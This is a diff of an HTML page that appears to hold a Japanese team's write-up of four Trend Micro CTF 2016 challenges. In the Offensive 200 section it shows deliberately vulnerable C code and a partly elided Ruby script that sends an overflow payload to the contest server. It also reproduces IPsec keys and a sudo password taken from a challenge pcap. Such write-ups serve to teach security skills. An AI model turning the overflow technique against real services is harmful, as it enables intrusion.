@@ -1,149 +1,12 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-<meta name="HandheldFriendly" content="True" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-<meta name="generator" content="Hugo 0.131.0">
-
-
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
-<meta name="msapplication-TileColor" content="#da532c">
-<meta name="theme-color" content="#ffffff">
-
-
-<title>Trend Micro CTF 2016 Online qualifier - urandom</title>
-
-
-<meta name="author" content="urandom" />
-
-
-<meta name="description" content="CTF team made up of graduates from University of Tsukuba, Japan" />
-
-
-<meta name="keywords" content="CTF, Write-ups, TMCTF" />
-
-
-<meta property="og:title" content="Trend Micro CTF 2016 Online qualifier" />
-<meta name="twitter:title" content="Trend Micro CTF 2016 Online qualifier" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://urandom.team/post/tmctf2016-qual/" /><meta property="og:description" content="日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。 urandomは4問解答し600点、92位でした。 Analysis-Offensive 100をyyu、Analysis-Offensi" />
-<meta name="twitter:description" content="日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。 urandomは4問解答し600点、92位でした。 Analysis-Offensive 100をyyu、Analysis-Offensi" /><meta property="og:image" content="https://urandom.team/images/og.png" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://urandom.team/images/og.png" /><meta property="article:published_time" content="2016-08-17T00:17:26+09:00" /><meta property="article:modified_time" content="2016-08-17T00:17:26+09:00" />
-
-
-<style>
-    @media (prefers-color-scheme: dark) {
-        body[data-theme='auto'] img {
-            filter: brightness(60%);
-        }
-    }
-
-    body[data-theme='dark'] img {
-        filter: brightness(60%);
-    }
-</style>
-
-
-
-
-<link rel="stylesheet" href="https://urandom.team/assets/css/fuji.min.css" />
-
-
-
-
-
-
-
-
-</head>
-
-<body
-  data-theme="auto"
-  data-theme-auto='true'
-  >
-    <script data-cfasync="false">
-  
-  var fujiThemeData = localStorage.getItem('fuji_data-theme');
-  
-  if (!fujiThemeData) {
-    localStorage.setItem('fuji_data-theme', 'auto');
-  } else {
-    
-    if (fujiThemeData !== 'auto') {
-      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
-    }
-  }
-</script>
-
-    <header>
-    <div class="container-lg clearfix">
-        <div class="col-12 header">
-            <a class="title-main" href="https://urandom.team/">urandom</a>
-            
-        </div>
-    </div>
-</header>
-
-    <main>
-        <div class="container-lg clearfix">
-            
-            <div class="col-12 col-md-9 float-left content">
-                
-<article>
-    
-    <h2 class="post-item post-title">
-        <a href="https://urandom.team/post/tmctf2016-qual/">Trend Micro CTF 2016 Online qualifier</a>
-    </h2>
-    <div class="post-item post-meta">
-        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2016-08-17</span>
-
-
-
-<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/ctf">CTF</a>&nbsp;<a href="/tags/write-ups">Write-ups</a>&nbsp;<a href="/tags/tmctf">TMCTF</a>&nbsp;</span>
-
-    </div>
-    
-    <div class="post-content markdown-body">
-        <p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/" target="_blank">Trend Micro CTF 2016</a>のwrite-upです。</p>
-<p>urandomは4問解答し600点、92位でした。</p>
-<p>Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。</p>
-<h1 id="analysis---offensive-100">Analysis - Offensive 100</h1>
-<blockquote>
-<p>Category: Analysis/Offensive</p>
-<p>Points: 100</p>
-<p>Please enter key. Key is TMCTF flag.</p>
-<p>Download the file
-Decrypt the downloaded file by the following command.</p>
-<p><code>openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip</code></p>
-<p><code>unzip files1.zip</code></p>
-</blockquote>
-<p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
-まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p>
-<pre><code class="language-javascript">var ko = &quot;c33367701511b4f6020ec61ded352059&quot;;
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=x-ua-compatible content="IE=edge"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=generator content="Hugo 0.119.0"><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Trend Micro CTF 2016 Online qualifier - urandom</title><meta name=author content="urandom"><meta name=description content="CTF team made up of graduates from University of Tsukuba, Japan"><meta name=keywords content="CTF,Write-ups,TMCTF"><meta property="og:title" content="Trend Micro CTF 2016 Online qualifier"><meta name=twitter:title content="Trend Micro CTF 2016 Online qualifier"><meta property="og:type" content="article"><meta property="og:url" content="https://urandom.team/post/tmctf2016-qual/"><meta property="og:description" content="日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。 urandomは4問解答し600点、92位でした。 Analysis-Offensive 100をyyu、Analysis-Offensi"><meta name=twitter:description content="日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。 urandomは4問解答し600点、92位でした。 Analysis-Offensive 100をyyu、Analysis-Offensi"><meta property="og:image" content="https://urandom.team/images/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://urandom.team/images/og.png"><meta property="article:published_time" content="2016-08-17T00:17:26+09:00"><meta property="article:modified_time" content="2016-08-17T00:17:26+09:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://urandom.team/assets/css/fuji.min.css></head><body data-theme=auto data-theme-auto=true><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header><div class="container-lg clearfix"><div class="col-12 header"><a class=title-main href=https://urandom.team>urandom</a></div></div></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h2 class="post-item post-title"><a href=https://urandom.team/post/tmctf2016-qual/>Trend Micro CTF 2016 Online qualifier</a></h2><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2016-08-17</span>
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/ctf>CTF</a>&nbsp;<a href=/tags/write-ups>Write-ups</a>&nbsp;<a href=/tags/tmctf>TMCTF</a>&nbsp;</span></div><div class="post-content markdown-body"><p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href=http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/ target=_blank>Trend Micro CTF 2016</a>のwrite-upです。</p><p>urandomは4問解答し600点、92位でした。</p><p>Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。</p><h1 id=analysis---offensive-100>Analysis - Offensive 100</h1><blockquote><p>Category: Analysis/Offensive</p><p>Points: 100</p><p>Please enter key. Key is TMCTF flag.</p><p>Download the file
+Decrypt the downloaded file by the following command.</p><p><code>openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip</code></p><p><code>unzip files1.zip</code></p></blockquote><p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
+まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p><pre><code class=language-javascript>var ko = &quot;c33367701511b4f6020ec61ded352059&quot;;
 
 var ka = &quot;61636f697b57b5b7d389db0edb801fc3&quot;;
 
 var kq = &quot;d2172edf24129e06f3913376a12919a4&quot;;
-</code></pre>
-<p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
-<ul>
-<li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li>
-<li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li>
-<li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li>
-</ul>
-<p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p>
-<pre><code class="language-javascript">var c = &quot;&quot;, d = &quot;&quot;, e = &quot;&quot;;
+</code></pre><p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p><ul><li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li><li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li><li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li></ul><p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p><pre><code class=language-javascript>var c = &quot;&quot;, d = &quot;&quot;, e = &quot;&quot;;
 for (var f = 0; f &lt; b.length; ) {
     c += b[nl[++f]];
     d += b[nl[++f]];
@@ -153,16 +16,7 @@ for (var f = 0; f &lt; b.length; ) {
 // ......中略......
 
 var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
-</code></pre>
-<p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
-<h1 id="analysis---offensive-200">Analysis - Offensive 200</h1>
-<blockquote>
-<p>Category: Analysis - offensive</p>
-<p>Points: 200</p>
-<p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p>
-<p>The following code contains a bug that can be exploited to read back a flag:</p>
-</blockquote>
-<pre><code class="language-c">int pwned;
+</code></pre><p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p><h1 id=analysis---offensive-200>Analysis - Offensive 200</h1><blockquote><p>Category: Analysis - offensive</p><p>Points: 200</p><p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p><p>The following code contains a bug that can be exploited to read back a flag:</p></blockquote><pre><code class=language-c>int pwned;
 char buffer[1024];
 
 DWORD WINAPI CallBack(LPVOID lpParameter) {
@@ -190,13 +44,7 @@ DWORD WINAPI CallBack(LPVOID lpParameter) {
 
 	return 0;
  }
-</code></pre>
-<blockquote>
-<p>Craft a packet that would return a valid flag. Good luck!</p>
-</blockquote>
-<p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p>
-<p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p>
-<pre><code class="language-ruby">require 'socket'
+</code></pre><blockquote><p>Craft a packet that would return a valid flag. Good luck!</p></blockquote><p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p><p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p><pre><code class=language-ruby>require 'socket'
 
 HOST = '52.197.128.90'
 port = (80..85).to_a.sample
@@ -211,17 +59,7 @@ sock.send(payload, 0)
 while r = sock.gets
   puts r
 end
-</code></pre>
-<p>そして正解をメモし忘れた 😇</p>
-<h1 id="misc-100">Misc 100</h1>
-<blockquote>
-<p>Category: Misc(iot and network)</p>
-<p>Points: 100</p>
-<p>Please analyze this pcap.</p>
-</blockquote>
-<p>pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。</p>
-<p>Wiresharkでtelnetでのやりとりをテキストとして見ると、 <code>ip xfrm state</code>を叩いている箇所がある。</p>
-<pre><code>.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
+</code></pre><p>そして正解をメモし忘れた 😇</p><h1 id=misc-100>Misc 100</h1><blockquote><p>Category: Misc(iot and network)</p><p>Points: 100</p><p>Please analyze this pcap.</p></blockquote><p>pcapファイルが渡される。中身を見ると、IPsecな通信と、普通にtelnetしている通信がある。</p><p>Wiresharkでtelnetでのやりとりをテキストとして見ると、 <code>ip xfrm state</code>を叩いている箇所がある。</p><pre><code>.]0;reds@localhost:~.[reds@localhost ~]$ sudo ip xfrm state
 .sudo ip xfrm state
 [sudo] password for reds: ynwa
 .
@@ -245,20 +83,7 @@ src 1.1.1.11 dst 1.1.1.10
 	replay-window 32 flag 20
 	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
 	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-</code></pre>
-<p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
-<h1 id="misc-200">Misc 200</h1>
-<blockquote>
-<p>Category: Misc(iot and network)</p>
-<p>Points: 200</p>
-<p>find all LTE bands this phone supported.</p>
-<p>the final answer will be from small to big, and use &lsquo;,&rsquo; to seperate without spaces.</p>
-<p>example&gt; if the answer is band 1 and 2 and 3, the key should be: &ldquo;TMCTF{1,2,3}&rdquo;</p>
-</blockquote>
-<p><code>ModemSettings.txt</code> というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。</p>
-<p>この <code>ModemSettings.txt</code> はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。</p>
-<p>LTEのバンドに関する設定は&quot;6828&quot;番にあるという。該当する箇所を引用する。</p>
-<pre><code>6828 (0x1AAC)   -   OK
+</code></pre><p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p><h1 id=misc-200>Misc 200</h1><blockquote><p>Category: Misc(iot and network)</p><p>Points: 200</p><p>find all LTE bands this phone supported.</p><p>the final answer will be from small to big, and use &lsquo;,&rsquo; to seperate without spaces.</p><p>example> if the answer is band 1 and 2 and 3, the key should be: &ldquo;TMCTF{1,2,3}&rdquo;</p></blockquote><p><code>ModemSettings.txt</code> というファイルが与えられ、そこからその携帯電話の対応しているLTEバンドを答える。</p><p>この <code>ModemSettings.txt</code> はどうやら NV-items_reader_writerというソフトウェアによる出力らしい。</p><p>LTEのバンドに関する設定は"6828"番にあるという。該当する箇所を引用する。</p><pre><code>6828 (0x1AAC)   -   OK
 FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
@@ -267,225 +92,27 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-</code></pre>
-<p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
-<p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p>
-<pre><code class="language-ruby">i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
-</code></pre>
-
-    </div>
-</article>
-
-
-
-
-            </div>
-            <aside class="col-12 col-md-3 float-left sidebar">
-    
-    <div class="sidebar-item sidebar-pages">
-        <h3>Pages</h3>
-        <ul>
-            
-            <li>
-                <a href="/">Home</a>
-            </li>
-            
-            <li>
-                <a href="/about/">About</a>
-            </li>
-            
-            <li>
-                <a href="/books/">Publication</a>
-            </li>
-            
-            <li>
-                <a href="/index.xml">RSS</a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-links">
-        <h3>Links</h3>
-        <ul>
-            
-            <li>
-                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-tags">
-        <h3>Tags</h3>
-        <div>
-            
-            <span>
-                <a href="/tags/ctf/">CTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/e-book/">E-Book</a>
-            </span>
-            
-            <span>
-                <a href="/tags/misc/">Misc</a>
-            </span>
-            
-            <span>
-                <a href="/tags/publication/">Publication</a>
-            </span>
-            
-            <span>
-                <a href="/tags/seccon/">SECCON</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tech/">Tech</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tmctf/">TMCTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/write-ups/">Write-Ups</a>
-            </span>
-            
-        </div>
-    </div>
-    <div class="sidebar-item sidebar-toc">
-        <h3>Table of Contents</h3><nav id="TableOfContents"></nav></div>
-</aside>
-
-        </div>
-        <div class="btn">
-    <div class="btn-menu" id="btn-menu">
-        <i class="iconfont icon-grid-sharp"></i>
-    </div>
-    <div class="btn-toggle-mode">
-        <i class="iconfont icon-contrast-sharp"></i>
-    </div>
-    <div class="btn-scroll-top">
-        <i class="iconfont icon-chevron-up-circle-sharp"></i>
-    </div>
-</div>
-<aside class="sidebar-mobile" style="display: none;">
-  <div class="sidebar-wrapper">
-    
-    <div class="sidebar-item sidebar-pages">
-        <h3>Pages</h3>
-        <ul>
-            
-            <li>
-                <a href="/">Home</a>
-            </li>
-            
-            <li>
-                <a href="/about/">About</a>
-            </li>
-            
-            <li>
-                <a href="/books/">Publication</a>
-            </li>
-            
-            <li>
-                <a href="/index.xml">RSS</a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-links">
-        <h3>Links</h3>
-        <ul>
-            
-            <li>
-                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-tags">
-        <h3>Tags</h3>
-        <div>
-            
-            <span>
-                <a href="/tags/ctf/">CTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/e-book/">E-Book</a>
-            </span>
-            
-            <span>
-                <a href="/tags/misc/">Misc</a>
-            </span>
-            
-            <span>
-                <a href="/tags/publication/">Publication</a>
-            </span>
-            
-            <span>
-                <a href="/tags/seccon/">SECCON</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tech/">Tech</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tmctf/">TMCTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/write-ups/">Write-Ups</a>
-            </span>
-            
-        </div>
-    </div>
-    
-    
-    
-    <div class="sidebar-item sidebar-toc">
-        <h3>Table of Contents</h3>
-        <nav id="TableOfContents"></nav>
-    </div>
-    
-    
-  </div>
-</aside>
-    </main>
-
-    <footer>
-    <div class="container-lg clearfix">
-        <div class="col-12 footer">
-            
-            <span>&copy; 2015-2024
-                <a href="https://urandom.team/">urandom</a>
-                All rights reserved.
-                 | <a href="https://github.com/urandom-ctf/urandom-ctf.github.io">Source code</a> 
-                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
-                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
-                                                    target="_blank">Hugo</a> 
-            </span>
-        </div>
-    </div>
-</footer>
-
-    
-<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
-
-
-
-<script defer src="/assets/js/fuji.min.js"></script>
-
-
-
-</body>
-
-</html>
+</code></pre><p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p><p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p><pre><code class=language-ruby>i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
+</code></pre></div></article></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/books/>Publication</a></li><li><a href=/index.xml>RSS</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/urandom-ctf target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>CTF</a></span>
+<span><a href=/tags/e-book/>E-book</a></span>
+<span><a href=/tags/misc/>Misc</a></span>
+<span><a href=/tags/publication/>Publication</a></span>
+<span><a href=/tags/seccon/>SECCON</a></span>
+<span><a href=/tags/tech/>tech</a></span>
+<span><a href=/tags/tmctf/>TMCTF</a></span>
+<span><a href=/tags/write-ups/>Write-ups</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/books/>Publication</a></li><li><a href=/index.xml>RSS</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/urandom-ctf target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>CTF</a></span>
+<span><a href=/tags/e-book/>E-book</a></span>
+<span><a href=/tags/misc/>Misc</a></span>
+<span><a href=/tags/publication/>Publication</a></span>
+<span><a href=/tags/seccon/>SECCON</a></span>
+<span><a href=/tags/tech/>tech</a></span>
+<span><a href=/tags/tmctf/>TMCTF</a></span>
+<span><a href=/tags/write-ups/>Write-ups</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2015-2024
+<a href=https://urandom.team>urandom</a>
+All rights reserved.
+| <a href=https://github.com/urandom-ctf/urandom-ctf.github.io>Source code</a>
+| Powered by <a href=https://github.com/dsrkafuu/hugo-theme-fuji/ target=_blank>Fuji-v2</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script>
+<script defer src=/assets/js/fuji.min.js></script></body></html>
